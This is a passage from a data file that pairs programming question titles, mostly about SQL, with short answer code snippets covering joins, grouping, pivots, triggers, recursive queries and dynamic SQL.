    Assign its counter a value of MAX(counters)+1.
    Also delete any message with a counter value less than (current_counter)-50.
"
11851,33923,select rows that having dependencies to other rows,"select c1
from table t
group by c1
having sum(case when c2 in ('b', 'c') then 1 else 0 end) > 0 
and sum(case when c2 = 'a' then 1 else 0 end) = 0
"
14762,73479,Adding (SELECTING) two more other columns to this resultset,"SELECT user_d
     , date_of_application
     , date_ended
     , ( SELECT te.grade
         FROM TableX AS te
         WHERE te.status = 'Ended'
           AND te.user_id = t.user_id
           AND te.date_ended < t.date_of_application      --- not sure if 
                                                          --- this is needed
         ORDER BY te.date_ended DESC
         LIMIT 1
       ) AS grade
     , status
FROM TableX AS t
WHERE status = 'Pending'
"
39357,18879,Query by a LONG column,"select 
   dbms_lob.instr(clob_contents,'TLP')
from 
   (select 
        dbms_metadata.get_ddl('VIEW','LOCKED_DOCUMENTS_V', 'SCHEMA') clob_contents 
    from 
        dual) get_clob
"
9980,2708,Netbeans MySql Database connection,"     C:\mysql\bin

     C:\Program Files\MySQL\MySQL Server 5.1\bin

     Installation Folder~\xampp\mysql\bin
"
3359,52941,SQL Pivot Column that has multiple values for same column,"select *
from (Select tt.name,
             (test + (case when count(*) over (partition by test) = 1
                           then ''
                           else cast(row_number() over (partition by test order by (select null)) as varchar(255))
                      end)) as test
      from testTbl tt
     ) as x
pivot(
 max(name) for test in ([prim], [sup], [1st], [Add1], [Add2], [Add3])
) as pivot1
"
37147,31432,Oracle date function,"SELECT br_data.upd_time FROM BANKREC.br_data where to_char(br_data.upd_time, 'DD-MON-YY') = '12-MAR-08';
"
25426,60118,Regular expressions in check constraint: does not accept numbers,"CHECK (NOT REGEXP_LIKE(first_name,'[[:digit:]]'))
"
18271,2191,"How do I sort by one field, and subsort by another field, in SQL?","order by VochurNo , CodeNoOrder 
"
8481,43056,Inner join to get those not in table,"var result = gr.people.Where(p => !gr.coaches.Any(c => c.personID == p.id));
"
15722,55191,Equivalent for SQL WITH RECURSIVE in Arel,"def lineage
  hierarchy = Arel::Table.new :hierarchy
  recursive_table = Arel::Table.new(table_name).alias :recursive
  select_manager = Arel::SelectManager.new(ActiveRecord::Base).freeze

  non_recursive_term = select_manager.dup.tap do |m|
    m.from table_name
    m.project Arel.star
    m.where arel_table[:id].eq(id)
  end

  recursive_term = select_manager.dup.tap do |m|
    m.from recursive_table
    m.project recursive_table[Arel.star]
    m.join hierarchy
    m.on recursive_table[:id].eq(hierarchy[:parent_id])
  end

  union = non_recursive_term.union :all, recursive_term
  as_statement = Arel::Nodes::As.new hierarchy, union

  manager = select_manager.dup.tap do |m|
    m.with :recursive, as_statement
    m.from hierarchy
    m.project hierarchy[:id]
  end

  ids = ActiveRecord::Base.connection.execute(manager.to_sql).field_values('id')
  ordering = ids.map { |id| arel_table[:id].eq(id) }

  self.class.where(id: ids).order(ordering)
end

private

def arel_table
  self.class.arel_table
end

def table_name
  self.class.table_name
end
"
3182,56383,SQL - Check if record exists in multiple tables,"select u.*,
       (c1.id_user is not null) as InCity1,
       (c2.id_user is not null) as InCity2
from users u left outer join
     city1 c1
     on u.id_user = c1.id_user left outer join
     city2 c2
     on u.id_user = c2.id_user;
"
18630,19076,Select where field in values (if field in value not exist return as null),"SELECT n.id
     , IF(a.id IS NULL,'Never',a.date) AS `date`
  FROM ( SELECT 1 AS id
         UNION ALL SELECT 2
         UNION ALL SELECT 3
         UNION ALL SELECT 4
       ) n
  LEFT
  JOIN another_table a
    ON a.id = n.id
 ORDER BY n.id
"
17146,52262,"CHECK constraint in SQL Server, via GUI or manually?","CREATE FUNCTION dbo.fnRedRows()
RETURNS INT
AS
BEGIN
    DECLARE @Return INT
    SELECT @Return=COUNT(*) FROM dbo.Red
    RETURN @Return
END
GO
CREATE TABLE dbo.Red 
(
    id INT IDENTITY(1,1), 
    test VARCHAR(max), 
    CONSTRAINT CK_MaxRows CHECK (dbo.fnRedRows()<5)
)
GO
INSERT INTO dbo.Red (test) VALUES ('HI')
INSERT INTO dbo.Red (test) VALUES ('The')
INSERT INTO dbo.Red (test) VALUES ('first four')
INSERT INTO dbo.Red (test) VALUES ('will work')
INSERT INTO dbo.Red (test) VALUES ('This one will fail')
GO
DROP TABLE dbo.Red
GO
DROP FUNCTION dbo.fnRedRows
GO
"
27479,55336,Find and replace text between ##,"DECLARE @OpenTag varchar(10)
SET @OpenTag = '#'

UPDATE p_suppliers
SET site= STUFF(site,
                       CHARINDEX(@OpenTag, site,1)  + LEN(@OpenTag),
                            CHARINDEX('#',site,1)-(CHARINDEX(@OpenTag, site,1)  + LEN(@OpenTag)), 
                       '')
"
32687,60109,How to (within code) Disconnect from SQL Connection on Incorrect Table Name?,"WHENEVER SQLERROR EXIT FAILURE ROLLBACK    
set serveroutput on
variable out_val varchar2;
exec &1;
print out_val
exit
"
39300,24961,Compare a SQL table column names with another table column data for missing columns,"--create table tableA(DiabetesA varchar(10),DiabetesB varchar(10),DiabetesC varchar(10))
--create table tableB(varname varchar(10))
--insert into tableB values ('DiabetesA')

select c.name from sys.columns c inner join sys.tables t on c.object_id=t.object_id and t.type='U' 
and t.name ='tableA '
left join tableB B on B.varname=C.name
where B.varname is NULL
"
5139,4045,Querying table with group by and sum,"SELECT [order], MAX(date) AS date, SUM(total) AS total 
FROM Orders o
GROUP BY [order]
"
26498,1796,Recursive Oracle query to get ultimate target but not intermediate paths,"select 
  connect_by_root src as src,
  trg ult_trg
from t 
where 
  connect_by_isleaf = 1
  connect by nocycle src = prior trg
order by ult_trg, src
"
5556,4453,Unexpected result in RPAD,"declare
    l_curid integer;
    l_desctab dbms_sql.desc_tab3;
    l_colcnt integer;
begin
    l_curid := dbms_sql.open_cursor;

    dbms_sql.parse(l_curid, 'select rpad(ename, instr(ename,'' '')), '
        || 'rpad(ename, 4), '
        || 'substr(ename, 1, instr(ename,'' '')) '
        || 'from emp where ename like ''B%''' , dbms_sql.native);

    dbms_sql.describe_columns3(l_curid, l_colcnt, l_desctab);

    for i in 1 .. l_colcnt loop
        dbms_output.put_line('column ' || i
            || ' ' || l_desctab(i).col_name
            || ' type ' || l_desctab(i).col_type
            || ' length ' || l_desctab(i).col_max_len
        );
    end loop;

    dbms_sql.close_cursor(l_curid);
end;
/

column 1 RPAD(ENAME,INSTR(ENAME,'')) type 1 length 4000
column 2 RPAD(ENAME,4) type 1 length 16
column 3 SUBSTR(ENAME,1,INSTR(ENAME,'')) type 1 length 40
"
10187,68305,How to retrieve the column value based on formula,"select a.ID,
  (CASE WHEN PATINDEX('%Z1%', ISNULL(b.Formula1,'')+ISNULL(b.Formula2,''))<>0 THEN a.Z1 ELSE NULL END) Z1,
  (CASE WHEN PATINDEX('%Z2%', ISNULL(b.Formula1,'')+ISNULL(b.Formula2,''))<>0 THEN a.Z2 ELSE NULL END) Z2,
  (CASE WHEN PATINDEX('%Z3%', ISNULL(b.Formula1,'')+ISNULL(b.Formula2,''))<>0 THEN a.Z3 ELSE NULL END) Z3,
  (CASE WHEN PATINDEX('%Z4%', ISNULL(b.Formula1,'')+ISNULL(b.Formula2,''))<>0 THEN a.Z4 ELSE NULL END) Z4, 
  b.* 
From TABLE1 a inner join TABLE2 b on a.type=b.type
"
16618,30654,Split and merge string,"DECLARE @Fullname VARCHAR(100) = 'Natalie Marine Baily';

select
    *,
    firstname+'.'+lastnameINITIAL+'@gamil.com'
    from (
select 
    @Fullname Fullname,
    SUBSTRING(@Fullname,1,CHARINDEX(' ',@Fullname,1)) firstname,
    SUBSTRING(SUBSTRING(@Fullname,LEN(@Fullname)-CHARINDEX(' ',REVERSE(@Fullname),1)+2,CHARINDEX(' ',REVERSE(@Fullname),1)),1,1) lastnameINITIAL
    ) T
"
34473,56572,Get all Related Products which are not available in Related Product Table?,"select *
from    Product
where   id not in
  (select RelatedProductID
   from   RelatedProduct
   where  productID = @productID)
"
5513,24903,Sql renaming several raw data,"UPDATE profile n JOIN (
    SELECT profile_id, username, (@row_number:=@row_number+1) as cntr 
    FROM profile,  (SELECT @row_number:=0) AS t 
    WHERE username IN ( SELECT username 
                FROM profile 
                GROUP BY username HAVING COUNT(*) > 1 )
            and (username, profile_id) not in ( SELECT username, MIN(profile_id)
                FROM profile 
                GROUP BY username HAVING COUNT(*) > 1 )
    ) d ON n.profile_id = d.profile_id 
SET n.username = CONCAT(n.username, d.cntr); 
"
10158,70788,Oracle Trigger Updating a field on an Insert or an Update,"CREATE OR REPLACE TRIGGER your_trigger_name
BEFORE INSERT OR UPDATE
ON your_table
FOR EACH ROW
DECLARE
BEGIN
   :new.LastUpdated := sysdate;
END;
"
16516,7471,MySQL: Unique constraint on multiple fields,"alter table Variable_Entries add unique (var_id, value);
"
25337,51237,How do I get column with the highest ID from a sql database table?,"select yourcolumn from yourtable where id=(select max(id) from yourtable )
"
21750,9421,Find rows in a table where field1 is the same and field 2 is different,"select a.serial_no, a.userID, a.EnrollmentID  
from a tableA 
where a.userID in (  
SELECT DISTINCT a.userID
FROM tableA  a, tableA  b
WHERE a.userID = b.userID
AND a.EnrollmentID <> b.EnrollmentID )
"
32937,34662,Sanity Check: (+) Operator in WHERE Clause for Oracle DB?,"SELECT BLAH
  FROM A_TABLE T1
  LEFT JOIN A_TABLE T2 ON T2.FIELD_1 = T1.FIELD_1
  LEFT JOIN A_TABLE T3 ON T3.FIELD_1 = T2.FIELD_1
 WHERE ... etc
"
33893,1932,Postgresql Select rows and update column,"update table 
    set proc = 1 
where id in (select id from table where status = 1)
returning *;
"
17715,72560,Create table using rows from another table as columns,"DECLARE @TableNo1 TABLE(Field varchar(128),DataType varchar(128))
DECLARE @s nvarchar(max)='CREATE TABLE dbo.TableNo2('
INSERT INTO @TableNo1
VALUES
('Field1','nvarchar(max)'),
('Field2','int')

SELECT  @s+=T.Field+' '+T.DataType+',' FROM   @TableNo1 T
SET @s=LEFT(@s,LEN(@s)-1)+')'
EXECUTE(@s)
"
20537,58916,PostgreSQL unique indexes and string case,"CREATE UNIQUE INDEX test_upper_idx ON mytable (UPPER(myfield));
"
15673,57395,Storing one or several sql statements as a variable in a stored procedure in SQL Server,"DECLARE @SQLQuery varchar(500)

SET @SQLQuery = 'SELECT * FROM Employees WHERE EmployeeID = 123'

EXECUTE(@SQLQuery)
"
30089,19707,"Selecting SQL TOP N rows from group, row_number, rank not working","SELECT rs.RunID,rs.SiteCode,rs.procedure_name,rs.total_cpu_time, rn
FROM (
       SELECT 
            RunID,  
            SiteCode,
            total_cpu_time, 
            procedure_name, 
            Row_Number() OVER (PARTITION BY SiteCode ORDER BY total_cpu_time DESC) AS rn
        FROM TopProcs 
        WHERE
           RunID = 1 
           AND SiteCode IN('CAS', 'P01')
    ) rs 
WHERE  
    rs.rn < 4
ORDER BY SiteCode
"
34420,44181,How can I subtract two row's values within same column using sql query?,"SELECT(t2.sub1 - t1.sub1) AS sub1, (t2.sub2 - t1.sub2) AS sub2
FROM table t1 CROSS JOIN
     table t2
WHERE t1.date = '2014-11-08' AND t2.id = '2014-11-07';
"
35245,1846,Find lowest ID that does not exist,"SELECT (t.id + 1)
FROM `table` as t
LEFT JOIN `table` s ON s.id = (t.id + 1)
WHERE s.id IS NULL
ORDER BY t.id
LIMIT 1
"
10551,5342,Database table with many rows - correct use,"create table ratings (
  user_id integer not null, -- references users (user_id), not shown
  item_id integer not null, -- references items (item_id), not shown
  primary key (user_id, item_id),
  rating integer not null check (rating between 1 and 5) -- ?
  date_rated date not null default current_date
);

create index on ratings (date_rated);
"
13168,25622,How to check if a count statement returns a specific value,"SELECT rev.name, s.title, count(r.mId)
FROM reviewer rev, song s, rating r 
WHERE (r.rID = rev.rID) AND (r.mID = s.sID) 
GROUP BY rev.name, s.title
HAVING count(r.mId) = 3
"
31474,47598,Rows to field level in query?,"SELECT 
Orders.Name, 
Orders.Date,
(SELECT Comment +', ' FROM OrderComments WHERE OrderComments.OrderId = Orders.OrderId FOR XML PATH(''))
FROM Orders
"
19737,18702,Inefficient Merge with 1 row,"MERGE [dbo].[Redeemers] AS dbTarget
USING
(
SELECT @Email as Email, @DateRd as DateRd
)
AS dbSource
ON
(
dbSource.Email = dbTarget.Email
)

WHEN MATCHED
....

WHEN NOT MATCHED 
...
"
25267,74145,How Do I Escape Apostrophes in Field Valued in SQL Server?,"ISNULL('N'''+ REPLACE(Convert(varchar(8000),Type), '''', '''''') + '''','NULL') + ','
"
31214,57415,how to search multi-categories in mysql,"SELECT v.v_id
FROM property_video pv
    JOIN video v
    ON pv.pv_v_id = v.v_id
WHERE pv.pv_p_id IN (12,15)
GROUP BY v.v_id
HAVING count(distinct pv.pv_p_id) = 2
"
25856,63228,"SQL magic - query shouldn't take 15 hours, but it does","SELECT cur.source_prefix, 
       cur.source_name, 
       cur.category, 
       cur.element_id,
       MAX(cur.date_updated) AS DateUpdated, 
       AVG(cur.value) AS AvgValue,
       SUM(cur.value * cur.weight) / SUM(cur.weight) AS Rating
FROM eev0 cur
LEFT JOIN eev0 next
    ON next.date_updated < '2009-05-01'
    AND next.source_prefix = cur.source_prefix 
    AND next.source_name = cur.source_name
    AND next.element_id = cur.element_id
    AND next.date_updated > cur.date_updated
WHERE cur.date_updated < '2009-05-01'
AND next.category IS NULL
GROUP BY cur.source_prefix, cur.source_name, 
    cur.category, cur.element_id
"
22214,68902,DataBase Modelling,"Student
    StudentID

Elective
    ElectiveID

ElectiveValue
    ElectiveValueID
    FK_ElectiveID
    Value

StudentElective
    StudentElectiveValueID
    FK_StudentID
    FK_ElectiveValueID
"
12307,38812,Specific foreign key explanation,"ALTER TABLE Department <-- Table that will have the foreign key constraint
ADD <-- Option
FOREIGN KEY managerIsInDepartment  <-- Name of the key
(manager,id) <-- Columns included in the key
REFERENCES Employee <-- The table being referenced
(id,worksAt) <-- Columns being referenced in foreign table
"
21965,45677,How to combine two unrelated SQL queries,"START TRANSACTION;
  INSERT INTO tableA VALUES ('', 'mike', '21');
  DELETE FROM tableB WHERE name = 'john';
COMMIT;
"
25511,65801,mysql | select record from table where month and year is not current or employee id,"SELECT     E.employee_id
FROM       employee E
INNER JOIN timesheet T ON T.`employee_id` = E.`employee_id` 
WHERE      T.`employee_id` NOT IN (1,2) OR -- Note the ""OR"" relationship
           DATE_FORMAT(T.`date_created`, '%Y-%m') != 
           DATE_FORMAT(NOW(), '%Y-%m')
"
22986,66005,Best Practice - Convert SQL query to LINQ,"var query = (from employee in db.Employee
             from business in db.Business
             where employee.Administrator == 1 ||
                 (business.BusinessId == 1 &&
                  (employee.EmployeeId == business.Initiator ||
                   employee.EmployeeId == business.Owner))
             select employee.EmployeeId).Distinct();
"
17100,55103,Add auto-incrementing column in temporary Common Table Expression,"select col, row_number() over ( order by col ) as id
  from temp
"
6152,47464,how to calculate cumulative salary in hive,"select t1.* ,
sum(salary) over (order by id) cumsalary
from table t1
"
16237,30300,Guidance required for sql query,"select * 
from yourtable
where companyid in (
  select companyid
  from yourtable
  group by companyid
  having count(1) = (
    select count(1) cnt 
    from yourtable
    group by companyid
    order by 1 desc
    limit 1
    )
)
"
23780,19563,Associating Records Together,"select 
  datecreated, 
  servername,
  (
    select min(running.datecreated)
    from mytable running
    where running.heading = 'SQL Server running'
    and running.servername = notrunning.servername
    and running.datecreated > notrunning.datecreated
  ) as connected
from mytable notrunning
where heading = 'SQL Server status: Unable To Connect';
"
18690,75604,postgresql create function with multiple IF ELSE condition,"CREATE OR REPLACE FUNCTION check_label_id_exist(_labelid integer, OUT result text) as

$BODY$
 BEGIN

    IF EXISTS(SELECT 1 FROM table_1 WHERE label_id = _labelid limit 1) THEN

        result := 'true';

    ELSEIF EXISTS(SELECT 1 FROM table_2 WHERE label_id = _labelid limit 1) THEN

        result := 'true';

    ELSEIF EXISTS(SELECT 1 from table_3 WHERE label_id = _labelid limit 1) THEN

        result := 'true';

    ELSE

        result := 'false';
    END IF;

    RETURN;
END
$BODY$ language plpgsql;
"
4173,59662,ms SQL join multiple row into multitple column,"SELECT DISTINCT
        name ,
        product ,
        ( SELECT    sales
          FROM      yourtable b
          WHERE     a.product = b.product
                    AND MONTH = 1
                    AND YEAR = 2014
        ) m1sales ,
        ( SELECT    starget
          FROM      yourtable b
          WHERE     a.product = b.product
                    AND MONTH = 1
                    AND YEAR = 2014
        ) m1starget ,
        ( SELECT    growth
          FROM      yourtable b
          WHERE     a.product = b.product
                    AND MONTH = 1
                    AND YEAR = 2014
        ) m1growth ,
        ( SELECT    sales
          FROM      yourtable b
          WHERE     a.product = b.product
                    AND MONTH = 2
                    AND YEAR = 2014
        ) m2sales ,
        ( SELECT    starget
          FROM      yourtable b
          WHERE     a.product = b.product
                    AND MONTH = 2
                    AND YEAR = 2014
        ) m2starget ,
        ( SELECT    growth
          FROM      yourtable b
          WHERE     a.product = b.product
                    AND MONTH = 2
                    AND YEAR = 2014
        ) m2growth ,
        ( SELECT    sales
          FROM      yourtable b
          WHERE     a.product = b.product
                    AND MONTH = 3
                    AND YEAR = 2014
        ) m3sales ,
        ( SELECT    starget
          FROM      yourtable b
          WHERE     a.product = b.product
                    AND MONTH = 3
                    AND YEAR = 2014
        ) m3starget ,
        ( SELECT    growth
          FROM      yourtable b
          WHERE     a.product = b.product
                    AND MONTH = 3
                    AND YEAR = 2014
        ) m3growth
FROM    yourtable a
"
35118,30432,Count downloads with two tables,"  SELECT n.ID,
         n.name,
         COUNT(timestamp) as downloads
    FROM names n 
         LEFT JOIN downloads d 
              ON d.name_id = n.id
GROUP BY n.ID,
         n.name
ORDER BY n.ID;
"
34427,22834,How to get a table to make a new column based on user data?,"SELECT EAGLE_ID
    ,DEPT_ID
    ,LAST_NAME
    ,FIRST_NAME
    ,MIDDLE_NAME
    ,GENDER
    ,BIRTHDATE
    ,ETHNICITY
    ,TENURE
    ,SHORT_TITLE
    ,FULL_TIME
    ,EMAIL
    ,CASE 
        WHEN GENDER = 'Male'
            THEN 'Yes'
        WHEN GENDER = 'Female'
            THEN 'No'
        ELSE ''
        END AS [Financial_Aid]
FROM ADD_FACULTY_OVERRIDE
"
32326,19486,Generate report from URL - SQL Server Reporting Services 2008,"For example, to specify two parameters, “ReportMonth” and “ReportYear”, defined in a 
report, use the following URL for a native mode report server:

http://myrshost/ReportServer?/AdventureWorks 2008R2/Employee_Sales_Summary_2008R2&ReportMonth=3&ReportYear=2008
"
21466,5143,SQL Server: date conversion problem,"DateAdd(Day, DateDiff(Day, 0, GetDate()), 0)
"
23069,2715,Get the value at runtime,"declare @test varchar(20)
set @test ='DatabaseName'

declare @SQL nvarchar(max)
set @SQL = 'select b.* from '+quotename(@test)+'.dbo.Table_Name as b'

exec (@SQL)
"
9325,32913,"SQL SELECT statement inside of FROM, with INNER JOIN","INSERT INTO table1(col1, col2, col3)
    SELECT @col1, t2.col2, t3.col3
    FROM table4 t4 INNER JOIN
         #table2 t2
         ON t4.ID = t2.ID;
"
9677,3046,How to get two rows value,"select Concat(ID, Name)
from MyTable
"
38807,61390,Subtract Two Columns In SQL,"select TotalCredits - TotalDebits as Difference
from 
(
select
(select sum(TOTALAMOUNT) from journal where memberid=48 and CREDIT =1) as TotalCredits,
(select SUM(totalamount) from Journal where MEMBERID=48 and DEBIT =1) As TotalDebits
) temp
"
6798,51839,How to filter first appearance in table only,";with latestApplication AS
(
    SELECT DATEADD(ww,(DATEDIFF(ww,0,[tblApplicantSchools_shadow].updated)),0) 
               AS Datesubmitted,
        [tblApplicantSchools_shadow].applicantID,
        ROW_NUMBER() OVER (PARTITION BY [tblApplicantSchools_shadow].applicantID 
                           ORDER BY [tblApplicantSchools_shadow].id) 
            AS rn
    FROM tblApplicants  
    INNER JOIN tblApplicantSchools_shadow 
        ON tblApplicantS.ApplicantID = tblApplicantSchools_shadow.applicantID
    WHERE ApplyingForYear = '2013/14' 
    AND [tblApplicantSchools_shadow].statusID = 4
)
select Datesubmitted, COUNT(1) AS TotalAppsPerWeek
FROM latestApplication
WHERE rn = 1
group by Datesubmitted
order by Datesubmitted DESC
"
26050,61082,Query optimization possibilities?,"SELECT
  quote_id,
  MAX(created_at) AS max_created_at
FROM billing_pricequotestatus
GROUP BY quote_id
"
37431,57505,Retrieve CREATE TABLE code of an already existing table?,"SHOW CREATE TABLE yourtable;
"
15023,58961,SQL Server deleted identity columns,"SET IDENTITY_INSERT [YourTableName] ON
--do your update/insert query here
SET IDENTITY_INSERT [YourTableName] OFF
"
30361,61984,How to get next minimum date that is not within 30 days and use as reference point in SQL?,";with cte1
as
(
    select 
        ID, Date, 
        row_number()over(partition by ID order by Date) groupID
    from #test
),
cte2
as
(
    select ID, Date, Date as DateTmp, groupID, 1 as getRow from cte1 where groupID=1
    union all
    select 
        c1.ID, 
        c1.Date, 
        case when datediff(Day, c2.DateTmp, c1.Date) > 30 then c1.Date else c2.DateTmp end as DateTmp,
        c1.groupID, 
        case when datediff(Day, c2.DateTmp, c1.Date) > 30 then 1 else 0 end as getRow
    from cte1 c1
    inner join cte2 c2 on c2.groupID+1=c1.groupID and c2.ID=c1.ID
)
select ID, Date from cte2 where getRow=1 order by ID, Date
"
9946,61786,How to execute a user defined function in SQL that has a paramter being passed to it?,"SELECT * FROM dbo.TestFunction (your_parameters_separated_by_commas)
"
8903,1325,Whats a good solution to dynamically build 'AND' operator functionality for SQL?,"DECLARE @OccupationAndListTable dbo.IdList_TableType
INSERT INTO @OccupationAndListTable
SELECT 3
UNION
SELECT 12

DECLARE @occupationCount INT
SELECT @occupationCount = COUNT(1) FROM @OccupationAndListTable 

;WITH po AS (
   SELECT 
       PersonOccupation.PersonId,
       COUNT(1) AS OccupationCount
   FROM PersonOccupation
       JOIN @OccupationAndListTable AS olt ON PersonOccupation.OccupationId = olt.Id
   GROUP BY PersonOccupation.PersonId
)
SELECT
    Candidate.PersonId,
    Person.Name
FROM
    Candidate
    INNER JOIN Person on Candidate.PersonId = Person.Id
    LEFT JOIN po ON Person.Id = po.PersonId
WHERE Candidate.IsActive = 1
    AND ISNULL(po.OccupationCount,0) = @occupationCount
"
31569,9114,Can this be done in a single SQL query?,"SELECT list_id, name, (m.list_id is not null) as MemberOnList
FROM lists l LEFT JOIN
     members m
     ON l.list_id = m.list_id and
        m.member_id = @CURRENTUSER;
"
37267,38519,Using sp_send_dbmail with recieptent and content from single sql row,"DECLARE
      @txt NVARCHAR(MAX)
    , @name NVARCHAR(60)
    , @email VARCHAR(100)

DECLARE cur CURSOR FAST_FORWARD READ_ONLY LOCAL FOR
    SELECT 'Your old user id: ' + CAST(oldUserID AS NVARCHAR(100)) 
         + ', your new user id: ' + CAST(newUserID AS NVARCHAR(100)), name, email
    FROM ...

OPEN cur

FETCH NEXT FROM cur INTO @txt, @name, @email

    WHILE @@fetch_status = 0
    BEGIN

        EXEC msdb.dbo.sp_send_dbmail @profile_name = ...
                                   , @recipients = @email
                                   , @subject = @name
                                   , @body = @txt
                                   , @body_format = 'HTML'

    FETCH NEXT FROM cur INTO @txt, @name, @email

    END

CLOSE cur
DEALLOCATE cur
"
18204,12348,Decode vs Joining Table,"INNER JOIN TableB TB ON (TA.Column1= TB.Column2) AND TB.MySelectFlag = 1
"
25619,58980,Issue with sql and inserting guid number,"Guid g = Guid.NewGuid();
"
14479,49738,D: (ddbc) can I do SELECT with one request?,"auto users = stmt.select!User.array
"
9689,52090,"SQL: How to ""select into outfile"" the owner of current user?","$ mysql -e ""select ... into outfile ...; system chown $USER:$USER ...;""
"
18958,2792,"MySQL one-to-many mapping query - if match on many, do not return one","SELECT brand 
  FROM table_name 
 GROUP BY brand
HAVING MAX(vehicle = 'car') = 1 
   AND MAX(vehicle = 'truck') = 0
   AND MAX(vehicle = 'suv') = 0;
"
916,59259,How to get count based on multiple groupings,"select count(case when t2.cn=1 and t1.UserId = 1 and t1.TypeId =1 then 1 else null end) as case1,
       count(case when t2.cn=1 and t1.UserId = 1 and t1.TypeId =0 then 1 else null end) as case2,
       count(case when t2.cn>1 and t1.UserId = 1 and t1.TypeId =1 then 1 else null end) as case3,
       count(case when t2.cn>1 and t1.UserId = 1 and t1.TypeId =1 then 1 else null end) as case4
 from table1 t1
 join (select count(distinct UserId) as cn, TypeId, from table) t2
 on  t1.TypeId = t2.TypeId
"
22992,41437,Preventing Duplicate Values in a SQL table,"INSERT INTO tbl_PhoneNumber( MTN )
SELECT distinct [Wireless Number]
FROM [dbo].[tbl_Raw_Data]
Where NOT EXISTS(SELECT 1
                 FROM tbl_PhoneNumber
                 WHERE tbl_PhoneNumber.[MTN] = [tbl_Raw_Data].[Wireless Number])
"
10617,52058,select all from XML in sql,"declare @xmlData xml
select @xmlData = '<data><value>
    <TradeId>5555</TradeId>
    <Account>SomeAccount</Account>
    <Book>1</Book>
    <LocalCcy>XXXX</LocalCcy>
    <ValuationCcy>XXXX</ValuationCcy>
    <PVLocal>44444444</PVLocal>
    <PresentValue>44444444</PresentValue>
    <InstrumentCode>XXXXXXXXX</InstrumentCode>
</value></data>'

select
    t.c.value('./text()[1]', 'nvarchar(100)') as strValue
from  @xmlData.nodes('//value/child::node()') as t(c)
"
6743,39298,Sort results from an Android sdk Cursor's managedQuery in a case insensitive manner,"select file_name_column from table_name where file_name_column like ""%.mp3"" or file_name_column like ""%.wav"" ORDER BY file_name_column COLLATE NOCASE ASC;
"
4376,13076,What is the SQL statement that removes duplicates but keep additional column's data?,"select CUSTOMER_ID, VEHICLE_ID, DEALER_ID, EVENT_TYPE_ID, 
    max(EVENT_INITIATED_DATE)
from MyTable 
group by CUSTOMER_ID, VEHICLE_ID, DEALER_ID, EVENT_TYPE_ID
"
35744,30883,SQL Multiple Lookups from Join,"SELECT cust_country.CountryName,
   prov_country.CountryName,
   prod_country.CountryName
FROM   tblCustomer cu
   INNER JOIN tblProvider pr
     ON cu.ProvID = pr.ProvID
   INNER JOIN tblProduct po
     ON pr.ProdID = po.ProdID 
   INNER JOIN tblCountry cust_country
     ON cu.CustomerCountryID = cust_country.CountryID
   INNER JOIN tblCountry prov_country
     ON pr.CustomerCountryID = prov_country.CountryID
   INNER JOIN tblCountry prod_country
     ON co.CustomerCountryID = prod_country.CountryID
"
7928,24793,storing data locally on the iphone,"NSUserDefaults *prefs = [NSUserDefaults standardUserDefaults];  //load NSUserDefaults
NSArray *fakeFavs = [[ NSArray alloc] initWithObjects:@""2"",@""4"", @""100"", nil];  //declare array to be stored in NSUserDefaults
[prefs setObject:fakeFavs forKey:@""favourites""];  //set the prev Array for key value ""favourites""
"
22235,21895,How can I get last revision_id of particular event_id?,"SELECT event_id, max(revision_id)
FROM mytable
GROUP BY event_id
"
37182,17301,Preventing an application from accessing a database,"::Batch wrapper for the TEST application
@set TNS_ADMIN=""\path\to\test_tns_admin""
@""\path\to\real\application.exe""
"
19051,37452,Check if table exists in default schema for a user?,"IF (EXISTS (SELECT * 
                 FROM INFORMATION_SCHEMA.TABLES 
                 WHERE TABLE_SCHEMA = SCHEMA_NAME() 
                 AND  TABLE_NAME = 'TheTable'))
BEGIN
    --Do Stuff here
END
"
36215,46068,How to show sub query columns,"SELECT * 
from switch_person 
join project on PTPK = PK
where TeamLead  = 1 and status = 1
"
29738,31207,Joining and nesting queries in mysql,"select 
    users.name, 
    sum(race_results.winnings) as total_winnings, 
    count(*) AS total_races,
    sum(race_results.place = 1) AS times_won_first_place ,
    sum(race_results.place = 2) AS times_won_second_place,
    sum(race_results.place = 3) AS times_won_third_place 
from users 
inner join race_results 
where race_results.userid = users.id 
group by users.id 
order by total_winnings desc;
"
24352,33014,EntityFramework: Retrieve data with a condition on two different context,"List<int> someIds = ...
var result = context.Data.Where(d => someIds.Contains(d.Id)).ToList();
"
9544,62991,SQL query for insert into with update on duplicate key,"select coalesce(d.id, c.id) as id, coalesce(credit, 0) as credit,
       (coalesce(debit, 0) - coalesce(credit, 0)) as DebitMinusCredit
from (select id, sum(debit) as debit
      from debit
      group by id
     ) d full outer join
     (select id, sum(credit) as credit
      from debit
      group by id
     ) c
     on d.id = c.id;
"
25126,54553,"How to best store and aggregate daily, weekly, monthly visits for quick retrieval?","INSERT INTO TABLE_VISITS_LAST_SEVEN_DAYS 
SELECT @UserID, @VisitDate
WHERE NOT EXISTS (
  SELECT 1 FROM TABLE_VISITS_LAST_SEVEN_DAYS (NOLOCK)
  WHERE UserID=@UserID AND VisitDate=@VisitDate
)
"
239,51226,Querying the same table for a list of databases in MS SQL Server,"Select name Into #Versions
From sys.databases
Where name Like 'test%'

declare @sql as varchar(max) = ''
select @sql = @sql + 'INSERT INTO sometable SELECT TOP 1 * FROM ' + name + '..sourcetable ORDER BY somedate DESC; '
FROM #Versions

exec (@sql)

Drop Table #Versions
"
37022,47450,SQL - managing character vs. numerical values in a single variable,"WHERE
  CAST(CASE
    WHEN a.variable = 'X' THEN '10'
    ELSE a.variable
  END AS int) >= 2
"
29782,64633,SQL Calculating full months,"UPDATE TABLE.TICKETS
SET STATUS = 'Closed'
WHERE OPENED_DATE < dateadd(mm, -6, GETDATE() - day(getdate) + 1)
"
21627,6288,Special characters in sql not displaying correctly,"$str = ""a'string"";
echo htmlentities($str,ENT_QUOTES);                                //OUTPUT a&#039;string
echo html_entity_decode(htmlentities($str,ENT_QUOTES),ENT_QUOTES); //OUTPUT a'string
"
9752,57532,Combining multiple columns in 1 resultset,"SELECT id, date(now()) as `date`, 
      SUM(IF(date(`date`) = date(now()), `amount`, 0)) as TodayTotalSales,
      SUM(IF(date(`date`) < date(now()), `amount`, 0)) as OtherDaySales
FROM sales;
"
37105,24902,SQL View. Select count... Where,"SELECT Col1, Col2, 
  SUM(CASE WHEN Result=1 THEN 1 ELSE 0 END) Result1, 
  SUM(CASE WHEN Result=2 THEN 1 ELSE 0 END) Result2 
  FROM yourTable
  GROUP BY Col1, Col2
"
